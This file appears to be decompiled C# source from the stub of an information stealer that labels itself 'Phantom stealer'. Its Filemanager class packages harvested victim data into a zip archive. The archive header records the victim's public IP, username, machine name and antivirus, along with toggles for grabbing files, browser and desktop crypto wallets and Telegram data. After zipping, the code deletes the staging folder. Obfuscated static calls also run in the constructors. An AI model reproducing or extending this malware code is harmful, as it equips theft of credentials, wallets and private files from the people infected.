using System;
using System.IO;
using System.Linq;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200003E RID: 62
	internal sealed class Filemanager
	{
		// Token: 0x06000125 RID: 293 RVA: 0x0000D338 File Offset: 0x0000B538
		public static void RecursiveDelete(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			if (directoryInfo.Exists)
			{
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					Filemanager.RecursiveDelete(directoryInfo2.FullName);
				}
				FileInfo[] files = directoryInfo.GetFiles();
				foreach (FileInfo fileInfo in files)
				{
					fileInfo.IsReadOnly = false;
					fileInfo.Delete();
				}
				directoryInfo.Delete(true);
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x0000D3BC File Offset: 0x0000B5BC
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			if (!Directory.Exists(destFolder))
			{
				Directory.CreateDirectory(destFolder);
			}
			string[] files = Directory.GetFiles(sourceFolder);
			foreach (string text in files)
			{
				string fileName = Path.GetFileName(text);
				string text2 = Path.Combine(destFolder, fileName);
				File.Copy(text, text2);
			}
			string[] directories = Directory.GetDirectories(sourceFolder);
			foreach (string text3 in directories)
			{
				string fileName2 = Path.GetFileName(text3);
				string text4 = Path.Combine(destFolder, fileName2);
				Filemanager.CopyDirectory(text3, text4);
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x0000D458 File Offset: 0x0000B658
		public static long DirectorySize(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			long num = directoryInfo.GetFiles().Sum((FileInfo file) => file.Length);
			long num2 = directoryInfo.GetDirectories().Sum((DirectoryInfo subDir) => Filemanager.DirectorySize(subDir.FullName));
			return num + num2;
		}

		// Token: 0x06000128 RID: 296 RVA: 0x0000D4C8 File Offset: 0x0000B6C8
		public static string CreateArchive(string sourceDir, string outputZipPath = null)
		{
			if (!Directory.Exists(sourceDir))
			{
				throw new DirectoryNotFoundException("The directory '" + sourceDir + "' does not exist.");
			}
			string text = outputZipPath ?? (sourceDir + ".zip");
			string text2 = string.Concat(new string[]
			{
				"\nPhantom stealer ",
				Config.Version,
				"\n\n== System Info ==",
				string.Format("\nIP: {0}", SystemInfo.GetPublicIpAsync()),
				"\nDate: ",
				SystemInfo.Datenow,
				"\nUsername: ",
				SystemInfo.Username,
				"\nCompName: ",
				SystemInfo.Compname,
				"\nLanguage: ",
				SystemInfo.Culture,
				"\nAntivirus: ",
				SystemInfo.GetAntivirus(),
				"\n\n== Grabbed Files ==",
				Counter.GetBValue(Config.FileGrabberCheckBox == "1", "✅ FileGrabber: Enabled", "⛔ FileGrabber: Disabled"),
				"\n",
				Counter.GetBValue(Config.BrowserWallets == "1", "✅ BrowserWallets Recovery: Enabled", "⛔ BrowserWallets Recovery: Disabled"),
				"\n",
				Counter.GetBValue(Config.Telegram == "1", "✅ Telegram Files Recovery: Enabled", "⛔ Telegram Files Recovery: Disabled"),
				"\n",
				Counter.GetBValue(Config.DesktopWallets == "1", "✅ DesktopWallets Recovery: Enabled", "⛔ DesktopWallets Recovery: Disabled"),
				"\n"
			});
			ZipManager.CreateZip(sourceDir, text, text2);
			Filemanager.RecursiveDelete(sourceDir);
			Logging.Log("Archive '" + Path.GetFileName(text) + "' created at: " + text, true);
			return text;
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Filemanager()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600012A RID: 298 RVA: 0x000038AD File Offset: 0x00001AAD
		static Filemanager()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
